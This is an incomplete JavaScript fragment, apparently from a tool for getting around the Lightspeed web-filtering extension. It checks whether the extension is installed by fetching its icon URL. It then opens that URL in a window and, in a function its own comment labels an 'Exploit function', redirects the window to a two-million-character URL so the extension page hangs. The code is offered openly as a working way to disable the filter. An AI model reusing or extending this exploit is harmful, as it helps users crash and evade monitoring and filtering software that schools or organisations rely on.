 function checkForExtension() { // Checks if u have lightspeed installed
                const extURL = "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png";
                fetch(extURL)
                    .then(response => {
                        if (!response.ok) {
            ...
            function hanger() {
                ...
                let extURL = "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png";
                let extWin = window.open(extURL);

                setTimeout(function () { // Exploit function which opens a window pointing to lightspeed's web accessible url and then redirects it to a 2 million digit long URI
                    let killURL = "https://" + "e".repeat(2000000); // generates a really long URL that hangs the extension page
